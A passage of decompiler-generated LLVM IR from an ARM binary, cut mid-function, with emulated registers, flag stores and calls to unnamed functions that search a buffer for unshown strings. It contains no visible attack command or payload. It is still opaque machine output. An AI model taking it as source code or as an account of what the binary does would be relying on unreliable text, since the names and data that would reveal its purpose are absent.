  %v2_8dd8 = add i32 %v3_8dd0, %v4_8dbc
  store i32 %v2_8dd8, i32* @r4, align 4
  store i32 %v2_8dd8, i32* %v2_8dd0, align 4
  %v0_8de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_8de0 = load i32, i32* @sl, align 4
  %v2_8de0 = add i32 %v1_8de0, -1444
  %v3_8de0 = inttoptr i32 %v2_8de0 to i32*
  store i32 %v0_8de0, i32* %v3_8de0, align 4
  br label %dec_label_pc_8e70

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8e70
  %v1_8de8 = inttoptr i32 %v0_8e70 to i32*
  %v2_8de8 = load i32, i32* %v1_8de8, align 4
  store i32 %v2_8de8, i32* @r8, align 4
  %v1_8dec = load i32, i32* @r4, align 4
  %v5_8df0 = icmp slt i32 %v3_8e70, %v1_8dec
  %storemerge46 = select i1 %v5_8df0, i32 %v3_8e70, i32 %v1_8dec
  store i32 %storemerge46, i32* @r6, align 4
  %v2_8df8 = sub i32 %v3_8e70, %storemerge46
  store i32 %v2_8df8, i32* %r3.global-to-local, align 4
  %v2_8dfc = icmp ne i32 %v2_8de8, 0
  store i1 %v2_8dfc, i1* %cpsr_c.global-to-local, align 1
  %v7_8dfc = icmp eq i32 %v2_8de8, 1
  store i1 %v7_8dfc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8df8, i32* %v2_8e70, align 4
  br i1 %v7_8dfc, label %dec_label_pc_8ec0, label %.dec_label_pc_8e0cthread-pre-split_crit_edge

.dec_label_pc_8e0cthread-pre-split_crit_edge:     ; preds = %dec_label_pc_8de8
  %v1_8e04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8e04, i32* @r5, align 4
  br label %dec_label_pc_8e0c

dec_label_pc_8e0c:                                ; preds = %dec_label_pc_8e7c, %.dec_label_pc_8e0cthread-pre-split_crit_edge, %dec_label_pc_8ee8
  %v0_8e0c = phi i32 [ %v3_8ee8, %dec_label_pc_8ee8 ], [ %v1_8e04, %.dec_label_pc_8e0cthread-pre-split_crit_edge ], [ %v3_8e70, %dec_label_pc_8e7c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e0c = icmp eq i32 %v0_8e0c, 0
  store i1 %v2_8e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e0c, label %dec_label_pc_8e14, label %dec_label_pc_8e34

dec_label_pc_8e14:                                ; preds = %dec_label_pc_8e0c
  %v0_8e14 = load i32, i32* @sl, align 4
  %v1_8e14 = add i32 %v0_8e14, 8
  %v2_8e14 = inttoptr i32 %v1_8e14 to i32*
  %v3_8e14 = load i32, i32* %v2_8e14, align 4
  store i32 %v3_8e14, i32* @r4, align 4
  %v2_8e18 = icmp ne i32 %v3_8e14, 0
  store i1 %v2_8e18, i1* %cpsr_c.global-to-local, align 1
  %v7_8e18 = icmp eq i32 %v3_8e14, 1
  store i1 %v7_8e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e18, label %dec_label_pc_8ef0, label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8e14
  %v1_8e20 = add i32 %v0_8e14, 660
  %v2_8e20 = inttoptr i32 %v1_8e20 to i32*
  %v3_8e20 = load i32, i32* %v2_8e20, align 4
  %v0_8e24 = load i32, i32* @r6, align 4
  %v2_8e24 = sub i32 %v3_8e20, %v0_8e24
  store i32 %v2_8e24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e28 = icmp eq i32 %v2_8e24, 0
  store i1 %v2_8e28, i1* %cpsr_z.global-to-local, align 1
  %v2_8e2c = add i32 %v0_8e14, 12
  %v3_8e2c = inttoptr i32 %v2_8e2c to i32*
  store i32 %v2_8e24, i32* %v3_8e2c, align 4
  br i1 %v2_8e28, label %dec_label_pc_9704, label %dec_label_pc_8e34

dec_label_pc_8e34:                                ; preds = %dec_label_pc_8e0c, %dec_label_pc_8ef0, %dec_label_pc_8e20, %dec_label_pc_8f78
  %v0_8e34 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e34 = icmp eq i32 %v0_8e34, 0
  store i1 %v2_8e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e34, label %dec_label_pc_8e84, label %dec_label_pc_8e3c

dec_label_pc_8e3c:                                ; preds = %dec_label_pc_8e34
  %v0_8e3c = load i32, i32* @sl, align 4
  %v1_8e3c = add i32 %v0_8e3c, 660
  %v2_8e3c = inttoptr i32 %v1_8e3c to i32*
  %v3_8e3c = load i32, i32* %v2_8e3c, align 4
  store i32 %v3_8e3c, i32* %r3.global-to-local, align 4
  %v2_8e40 = sub i32 %v3_8e3c, %v0_8e34
  store i32 %v2_8e40, i32* @r4, align 4
  store i32 %v2_8e40, i32* %r2.global-to-local, align 4
  store i32 %v2_8e40, i32* %v2_8e3c, align 4
  %v0_8e4c = load i32, i32* @r7, align 4
  %v1_8e4c = load i32, i32* @r6, align 4
  %v2_8e4c = add i32 %v1_8e4c, %v0_8e4c
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 %v0_8e4c, i32* %r0.global-to-local, align 4
  %v3_8e54 = inttoptr i32 %v0_8e4c to i8*
  %v4_8e54 = call i32 @function_153fc(i8* %v3_8e54, i32 %v2_8e4c, i32 %v2_8e40)
  store i32 %v4_8e54, i32* %r0.global-to-local, align 4
  %v0_8e58 = load i32, i32* @sl, align 4
  %v1_8e58 = add i32 %v0_8e58, 660
  %v2_8e58 = inttoptr i32 %v1_8e58 to i32*
  %v3_8e58 = load i32, i32* %v2_8e58, align 4
  store i32 %v3_8e58, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8e60 = load i32, i32* @sb, align 4
  %v2_8e60 = add i32 %v0_8e60, %v3_8e58
  store i32 %v2_8e60, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e64 = icmp eq i32 %v3_8e58, 0
  store i1 %v2_8e64, i1* %cpsr_z.global-to-local, align 1
  %v3_8e68 = add i32 %v2_8e60, 2116
  %v4_8e68 = inttoptr i32 %v3_8e68 to i8*
  store i8 0, i8* %v4_8e68, align 1
  %v0_8e6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e6c, label %dec_label_pc_8e84, label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e3c, %dec_label_pc_8dd0
  %v0_8e70 = load i32, i32* @sl, align 4
  %v1_8e70 = add i32 %v0_8e70, 12
  %v2_8e70 = inttoptr i32 %v1_8e70 to i32*
  %v3_8e70 = load i32, i32* %v2_8e70, align 4
  store i32 %v3_8e70, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e74 = icmp eq i32 %v3_8e70, 0
  store i1 %v2_8e74, i1* %cpsr_z.global-to-local, align 1
  %v5_8e78 = icmp sgt i32 %v3_8e70, 0
  br i1 %v5_8e78, label %dec_label_pc_8de8, label %dec_label_pc_8e7c

dec_label_pc_8e7c:                                ; preds = %dec_label_pc_8e70
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8e0c

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8e3c, %dec_label_pc_8e34
  %v0_8e84 = load i32, i32* @sl, align 4
  %v1_8e84 = add i32 %v0_8e84, -1448
  %v2_8e84 = inttoptr i32 %v1_8e84 to i8*
  %v3_8e84 = load i8, i8* %v2_8e84, align 1
  %v4_8e84 = zext i8 %v3_8e84 to i32
  store i32 %v4_8e84, i32* %r3.global-to-local, align 4
  %v2_8e88 = icmp ugt i8 %v3_8e84, 6
  store i1 %v2_8e88, i1* %cpsr_c.global-to-local, align 1
  %v7_8e88 = icmp eq i8 %v3_8e84, 7
  store i1 %v7_8e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e88, label %dec_label_pc_8e90, label %dec_label_pc_87b4

dec_label_pc_8e90:                                ; preds = %dec_label_pc_8e84
  %v1_8e90 = add i32 %v0_8e84, 660
  %v2_8e90 = inttoptr i32 %v1_8e90 to i32*
  %v3_8e90 = load i32, i32* %v2_8e90, align 4
  store i32 %v3_8e90, i32* %r3.global-to-local, align 4
  %v2_8e94 = icmp ugt i32 %v3_8e90, 1023
  store i1 %v2_8e94, i1* %cpsr_c.global-to-local, align 1
  %v7_8e94 = icmp eq i32 %v3_8e90, 1024
  store i1 %v7_8e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e94, label %dec_label_pc_8e9c.loopexit, label %dec_label_pc_8d9c

dec_label_pc_8e9c.loopexit:                       ; preds = %dec_label_pc_8e90
  %v0_8e9c.pre = load i32, i32* @sb, align 4
  %v0_8ea4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.loopexit, %dec_label_pc_8d88
  %v0_8ea4 = phi i32 [ %v0_8ea4.pre, %dec_label_pc_8e9c.loopexit ], [ %v1_8d94, %dec_label_pc_8d88 ]
  %v0_8e9c = phi i32 [ %v0_8e9c.pre, %dec_label_pc_8e9c.loopexit ], [ %v0_8d8c, %dec_label_pc_8d88 ]
  %v1_8ea0 = add i32 %v0_8e9c, 2180
  store i32 %v1_8ea0, i32* %r1.global-to-local, align 4
  store i32 %v0_8ea4, i32* %r0.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_8eac = inttoptr i32 %v0_8ea4 to i8*
  %v4_8eac = call i32 @function_153fc(i8* %v3_8eac, i32 %v1_8ea0, i32 960)
  store i32 %v4_8eac, i32* %r0.global-to-local, align 4
  %v0_8eb0 = load i32, i32* @sl, align 4
  %v1_8eb0 = add i32 %v0_8eb0, 660
  %v2_8eb0 = inttoptr i32 %v1_8eb0 to i32*
  %v3_8eb0 = load i32, i32* %v2_8eb0, align 4
  store i32 %v3_8eb0, i32* %r3.global-to-local, align 4
  %v1_8eb4 = add i32 %v3_8eb0, -64
  store i32 %v1_8eb4, i32* @r4, align 4
  store i32 %v1_8eb4, i32* %v2_8eb0, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8de8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_8ec8 = call i32 @function_119d0(i32 36, i32* null)
  %v0_8ecc = load i32, i32* @r4, align 4
  store i32 %v0_8ecc, i32* %r1.global-to-local, align 4
  store i32 %v3_8ec8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8ed8 = load i32, i32* @r7, align 4
  store i32 %v0_8ed8, i32* %r0.global-to-local, align 4
  %v4_8edc = call i32 @function_123dc(i32 %v0_8ed8, i32 %v0_8ecc, i32 %v3_8ec8, i32 11)
  store i32 %v4_8edc, i32* %r0.global-to-local, align 4
  %v3_8ee0 = icmp eq i32 %v4_8edc, -1
  store i1 %v3_8ee0, i1* %cpsr_c.global-to-local, align 1
  %v8_8ee0 = icmp eq i32 %v4_8edc, -1
  store i1 %v8_8ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8ee0, label %dec_label_pc_8ee8, label %dec_label_pc_99a0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec0
  %v0_8ee8 = load i32, i32* @sl, align 4
  %v1_8ee8 = add i32 %v0_8ee8, 12
  %v2_8ee8 = inttoptr i32 %v1_8ee8 to i32*
  %v3_8ee8 = load i32, i32* %v2_8ee8, align 4
  store i32 %v3_8ee8, i32* @r5, align 4
  br label %dec_label_pc_8e0c

dec_label_pc_8ef0:                                ; preds = %dec_label_pc_8e14
  %v0_8ef0 = load i32, i32* @r7, align 4
  store i32 %v0_8ef0, i32* %r0.global-to-local, align 4
  %v1_8ef4 = add i32 %v0_8e14, 660
  %v2_8ef4 = inttoptr i32 %v1_8ef4 to i32*
  %v3_8ef4 = load i32, i32* %v2_8ef4, align 4
  store i32 %v3_8ef4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8f00 = call i32 @function_123dc(i32 %v0_8ef0, i32 %v3_8ef4, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  store i32 %v5_8f00, i32* %r0.global-to-local, align 4
  %v2_8f04 = icmp eq i32 %v5_8f00, -1
  store i1 %v2_8f04, i1* %cpsr_c.global-to-local, align 1
  %v7_8f04 = icmp eq i32 %v5_8f00, -1
  store i1 %v7_8f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f04, label %dec_label_pc_8e34, label %dec_label_pc_8f0c

dec_label_pc_8f0c:                                ; preds = %dec_label_pc_8ef0
  %v0_8f0c = load i32, i32* @sl, align 4
  %v1_8f0c = add i32 %v0_8f0c, 660
  %v2_8f0c = inttoptr i32 %v1_8f0c to i32*
  %v3_8f0c = load i32, i32* %v2_8f0c, align 4
  store i32 %v3_8f0c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8f18 = load i32, i32* @r7, align 4
  store i32 %v0_8f18, i32* %r0.global-to-local, align 4
  %v5_8f1c = call i32 @function_123dc(i32 %v0_8f18, i32 %v3_8f0c, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32 2)
  %v1_8f20 = load i32, i32* @sb, align 4
  %v2_8f20 = add i32 %v1_8f20, %v5_8f1c
  store i32 %v2_8f20, i32* %ip.global-to-local, align 4
  store i32 %v5_8f1c, i32* @r6, align 4
  store i32 %v5_8f1c, i32* %r1.global-to-local, align 4
  %v0_8f2c = load i32, i32* @r7, align 4
  store i32 %v0_8f2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32* %r2.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r4, align 4
  store i32 %v0_8f34, i32* %r3.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  %v1_8f38 = trunc i32 %v0_8f38 to i8
  %v3_8f38 = add i32 %v2_8f20, 2114
  %v4_8f38 = inttoptr i32 %v3_8f38 to i8*
  store i8 %v1_8f38, i8* %v4_8f38, align 1
  %v4_8f3c = call i32 @function_123dc(i32 %v0_8f2c, i32 %v5_8f1c, i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32 %v0_8f34)
  store i32 %v4_8f3c, i32* %r0.global-to-local, align 4
  %v2_8f40 = icmp eq i32 %v4_8f3c, -1
  store i1 %v2_8f40, i1* %cpsr_c.global-to-local, align 1
  %v7_8f40 = icmp eq i32 %v4_8f3c, -1
  store i1 %v7_8f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f40, label %dec_label_pc_8f64, label %dec_label_pc_8f48

dec_label_pc_8f48:                                ; preds = %dec_label_pc_8f0c
  %v0_8f48 = load i32, i32* @r7, align 4
  store i32 %v0_8f48, i32* %r0.global-to-local, align 4
  %v0_8f4c = load i32, i32* @r6, align 4
  store i32 %v0_8f4c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32* %r2.global-to-local, align 4
  %v0_8f54 = load i32, i32* @r4, align 4
  store i32 %v0_8f54, i32* %r3.global-to-local, align 4
  %v4_8f58 = call i32 @function_123dc(i32 %v0_8f48, i32 %v0_8f4c, i32 ptrtoint (i32* @global_var_197a0.38 to i32), i32 %v0_8f54)
  %v0_8f5c = load i32, i32* @sb, align 4
  %v2_8f5c = add i32 %v0_8f5c, %v4_8f58
  store i32 %v2_8f5c, i32* %r0.global-to-local, align 4
  %v0_8f60 = load i32, i32* @r5, align 4
  %v1_8f60 = trunc i32 %v0_8f60 to i8
  %v3_8f60 = add i32 %v2_8f5c, 2116
  %v4_8f60 = inttoptr i32 %v3_8f60 to i8*
  store i8 %v1_8f60, i8* %v4_8f60, align 1
  br label %dec_label_pc_8f64

dec_label_pc_8f64:                                ; preds = %dec_label_pc_8f0c, %dec_label_pc_8f48
  %v0_8f64 = load i32, i32* @r7, align 4
  store i32 %v0_8f64, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f6c = inttoptr i32 %v0_8f64 to i8*
  %v3_8f6c = call i32 @function_12448(i8* %v2_8f6c, i32 16)
  store i32 %v3_8f6c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f70 = icmp eq i32 %v3_8f6c, 0
  store i1 %v2_8f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f70, label %dec_label_pc_9b54, label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8f64
  %v1_8f78 = add i32 %v3_8f6c, 2
  store i32 %v1_8f78, i32* %r3.global-to-local, align 4
  %v1_8f7c = load i32, i32* @sl, align 4
  %v2_8f7c = add i32 %v1_8f7c, 12
  %v3_8f7c = inttoptr i32 %v2_8f7c to i32*
  store i32 %v1_8f78, i32* %v3_8f7c, align 4
  br label %dec_label_pc_8e34

dec_label_pc_8f84:                                ; preds = %dec_label_pc_858c
  %v2_8f84 = inttoptr i32 %v1_85e0 to i32*
  %v3_8f84 = load i32, i32* %v2_8f84, align 4
  store i32 %v3_8f84, i32* %ip.global-to-local, align 4
  %v3_8f8c = udiv i32 %v3_8f84, 32
  %v3_8f90 = mul nuw nsw i32 %v3_8f8c, 4
  store i32 %v2_86d8, i32* @lr, align 4
  %v2_8f98 = add i32 %v3_8f90, %v2_86d8
  store i32 %v2_8f98, i32* %r2.global-to-local, align 4
  %v1_8f9c = add i32 %v2_8f98, -164
  %v2_8f9c = inttoptr i32 %v1_8f9c to i32*
  %v3_8f9c = load i32, i32* %v2_8f9c, align 4
  %v1_8fa0 = urem i32 %v3_8f84, 32
  store i32 %v1_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v1_8584, i32* %r3.global-to-local, align 4
  %v7_8fa8 = shl i32 %v1_8584, %v1_8fa0
  %v8_8fa8 = or i32 %v3_8f9c, %v7_8fa8
  store i32 %v8_8fa8, i32* %r1.global-to-local, align 4
  %v1_8fac = load i32, i32* @r8, align 4
  %v2_8fac = sub i32 %v3_8f84, %v1_8fac
  %v3_8fac = icmp uge i32 %v3_8f84, %v1_8fac
  store i1 %v3_8fac, i1* %cpsr_c.global-to-local, align 1
  %v4_8fac = xor i32 %v1_8fac, %v3_8f84
  %v5_8fac = xor i32 %v2_8fac, %v3_8f84
  %v6_8fac = and i32 %v5_8fac, %v4_8fac
  %v7_8fac = icmp slt i32 %v6_8fac, 0
  %v8_8fac = icmp slt i32 %v2_8fac, 0
  %v9_8fac = icmp eq i32 %v3_8f84, %v1_8fac
  store i1 %v9_8fac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8fa8, i32* %v2_8f9c, align 4
  %v3_8fb4 = xor i1 %v8_8fac, %v7_8fac
  %v4_8fb4 = or i1 %v9_8fac, %v3_8fb4
  br i1 %v4_8fb4, label %dec_label_pc_85bc, label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f84
  %v0_8fb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fb8 = add i32 %v1_8fb8, %v0_8fb8
  store i32 %v2_8fb8, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8810
  store i32 %v3_8854, i32* @r0, align 4
  %v1_8fc4 = call i32 @function_15b20(i32 %v3_8854)
  store i32 %v1_8fc4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8fcc = load i32, i32* @sl, align 4
  %v2_8fcc = add i32 %v1_8fcc, -1452
  %v3_8fcc = inttoptr i32 %v2_8fcc to i32*
  store i32 -1, i32* %v3_8fcc, align 4
  %v0_8fd0 = load i32, i32* @r5, align 4
  %v1_8fd0 = trunc i32 %v0_8fd0 to i8
  %v2_8fd0 = load i32, i32* @sl, align 4
  %v3_8fd0 = add i32 %v2_8fd0, -1448
  %v4_8fd0 = inttoptr i32 %v3_8fd0 to i8*
  store i8 %v1_8fd0, i8* %v4_8fd0, align 1
  br label %dec_label_pc_87b4

dec_label_pc_8fd8:                                ; preds = %dec_label_pc_8594
  %v2_8fd8 = inttoptr i32 %v1_85e0 to i32*
  %v3_8fd8 = load i32, i32* %v2_8fd8, align 4
  store i32 %v3_8fd8, i32* %ip.global-to-local, align 4
  %v3_8fe0 = udiv i32 %v3_8fd8, 32
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v3_8fe8 = mul nuw nsw i32 %v3_8fe0, 4
  %v2_8fec = add i32 %v3_8fe8, %v2_86d8
  store i32 %v2_8fec, i32* %r2.global-to-local, align 4
  %v1_8ff0 = add i32 %v2_8fec, -164
  %v2_8ff0 = inttoptr i32 %v1_8ff0 to i32*
  %v3_8ff0 = load i32, i32* %v2_8ff0, align 4
  %v1_8ff4 = urem i32 %v3_8fd8, 32
  store i32 %v1_8ff4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8ffc = shl i32 1, %v1_8ff4
  %v8_8ffc = or i32 %v3_8ff0, %v7_8ffc
  store i32 %v8_8ffc, i32* %r1.global-to-local, align 4
  %v1_9000 = load i32, i32* @r8, align 4
  %v2_9000 = sub i32 %v3_8fd8, %v1_9000
  %v3_9000 = icmp uge i32 %v3_8fd8, %v1_9000
  store i1 %v3_9000, i1* %cpsr_c.global-to-local, align 1
  %v4_9000 = xor i32 %v1_9000, %v3_8fd8
  %v5_9000 = xor i32 %v2_9000, %v3_8fd8
  %v6_9000 = and i32 %v5_9000, %v4_9000
  %v7_9000 = icmp slt i32 %v6_9000, 0
  %v8_9000 = icmp slt i32 %v2_9000, 0
  %v9_9000 = icmp eq i32 %v3_8fd8, %v1_9000
  store i1 %v9_9000, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8ffc, i32* %v2_8ff0, align 4
  %v3_9008 = xor i1 %v8_9000, %v7_9000
  %v4_9008 = or i1 %v9_9000, %v3_9008
  br i1 %v4_9008, label %dec_label_pc_85bc, label %dec_label_pc_900c

dec_label_pc_900c:                                ; preds = %dec_label_pc_8fd8
  %v0_900c = load i32, i32* %ip.global-to-local, align 4
  %v1_900c = load i32, i32* %r3.global-to-local, align 4
  %v2_900c = add i32 %v1_900c, %v0_900c
  store i32 %v2_900c, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_9054:                                ; preds = %dec_label_pc_8798
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_905c = call i32 @function_123b8(i32 %v2_8278, i32 10240)
  store i32 %v2_905c, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9068 = load i32, i32* @sl, align 4
  %v1_9068 = add i32 %v0_9068, -1452
  %v2_9068 = inttoptr i32 %v1_9068 to i32*
  %v3_9068 = load i32, i32* %v2_9068, align 4
  store i32 %v3_9068, i32* @r0, align 4
  store i32 %v2_8278, i32* @r1, align 4
  store i32 10240, i32* @r2, align 4
  %v4_9074 = call i32 @function_14a08(i32 %v3_9068, i32 %v2_8278, i32 10240, i32 16386)
  store i32 %v4_9074, i32* %r0.global-to-local, align 4
  store i32 %v4_9074, i32* @fp, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_907c = icmp eq i32 %v4_9074, 0
  store i1 %v2_907c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp169 = icmp slt i32 %v4_9074, 1
  br i1 %tmp169, label %dec_label_pc_95bc, label %dec_label_pc_9088

dec_label_pc_9088:                                ; preds = %dec_label_pc_9054
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  store i32 %v4_9074, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9098 = call i32 @function_123dc(i32 %v2_8278, i32 %v4_9074, i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), i32 4)
  store i32 %v5_9098, i32* %r0.global-to-local, align 4
  %v3_909c = icmp eq i32 %v5_9098, -1
  store i1 %v3_909c, i1* %cpsr_c.global-to-local, align 1
  %v8_909c = icmp eq i32 %v5_9098, -1
  store i1 %v8_909c, i1* %cpsr_z.global-to-local, align 1
  %v0_90a4 = load i32, i32* @fp, align 4
  br i1 %v3_909c, label %dec_label_pc_90a4, label %dec_label_pc_90ac

dec_label_pc_90a4:                                ; preds = %dec_label_pc_9088
  %v3_90a4 = icmp ugt i32 %v0_90a4, 10239
  store i1 %v3_90a4, i1* %cpsr_c.global-to-local, align 1
  %v8_90a4 = icmp eq i32 %v0_90a4, 10240
  store i1 %v8_90a4, i1* %cpsr_z.global-to-local, align 1
  %v5_90a8 = icmp slt i32 %v0_90a4, 10240
  br i1 %v5_90a8, label %dec_label_pc_87b4, label %dec_label_pc_90ac

dec_label_pc_90ac:                                ; preds = %dec_label_pc_9088, %dec_label_pc_90a4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_90a4, i32* %r1.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v5_90bc = call i32 @function_123dc(i32 %v2_8278, i32 %v0_90a4, i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), i32 4)
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_90c8 = add i32 %v5_90bc, %v2_8278
  %v5_90c8 = inttoptr i32 %v4_90c8 to i8*
  store i8 0, i8* %v5_90c8, align 1
  %v0_90cc = load i32, i32* @r5, align 4
  store i32 %v0_90cc, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_90d4 = inttoptr i32 %v0_90cc to i32*
  %v3_90d4 = call i32 @function_119d0(i32 46, i32* %v2_90d4)
  %v0_90d8 = load i32, i32* @fp, align 4
  store i32 %v0_90d8, i32* @r1, align 4
  store i32 %v3_90d4, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_90e4 = call i32 @function_12680(i8* %v3_829c, i32 %v0_90d8, i32 %v3_90d4)
  store i32 %v4_90e4, i32* %r0.global-to-local, align 4
  %v2_90e8 = icmp eq i32 %v4_90e4, -1
  store i1 %v2_90e8, i1* %cpsr_c.global-to-local, align 1
  %v7_90e8 = icmp eq i32 %v4_90e4, -1
  store i1 %v7_90e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e8, label %.thread22, label %bb170

bb170:                                            ; preds = %dec_label_pc_90ac
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_90f0 = load i32, i32* @sl, align 4
  %v3_90f0 = inttoptr i32 %v2_90f0 to i32*
  store i32 2, i32* %v3_90f0, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_90ac, %bb170
  %v0_90f4 = load i32, i32* @r5, align 4
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_90fc = inttoptr i32 %v0_90f4 to i32*
  %v3_90fc = call i32 @function_119d0(i32 45, i32* %v2_90fc)
  %v0_9100 = load i32, i32* @fp, align 4
  store i32 %v0_9100, i32* @r1, align 4
  store i32 %v3_90fc, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_910c = call i32 @function_12680(i8* %v3_829c, i32 %v0_9100, i32 %v3_90fc)
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v2_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v2_9110, i1* %cpsr_c.global-to-local, align 1
  %v7_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v7_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9110, label %.thread23, label %bb171

bb171:                                            ; preds = %.thread22
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9118 = load i32, i32* @sl, align 4
  %v3_9118 = inttoptr i32 %v2_9118 to i32*
  store i32 1, i32* %v3_9118, align 4
  br label %.thread23

.thread23:                                        ; preds = %.thread22, %bb171
  %v0_911c = load i32, i32* @r5, align 4
  store i32 %v0_911c, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_9124 = load i32, i32* @sl, align 4
  %v2_9124 = add i32 %v1_9124, 4
  %v3_9124 = inttoptr i32 %v2_9124 to i32*
  store i32 %v0_911c, i32* %v3_9124, align 4
  %v2_9128 = inttoptr i32 %v0_911c to i32*
  %v3_9128 = call i32 @function_119d0(i32 44, i32* %v2_9128)
  %v0_912c = load i32, i32* @fp, align 4
  store i32 %v0_912c, i32* @r1, align 4
  store i32 %v3_9128, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9138 = call i32 @function_12680(i8* %v3_829c, i32 %v0_912c, i32 %v3_9128)
  store i32 %v4_9138, i32* %r0.global-to-local, align 4
  %v2_913c = icmp eq i32 %v4_9138, -1
  store i1 %v2_913c, i1* %cpsr_c.global-to-local, align 1
  %v7_913c = icmp eq i32 %v4_9138, -1
  store i1 %v7_913c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_913c, label %.thread24, label %dec_label_pc_9144

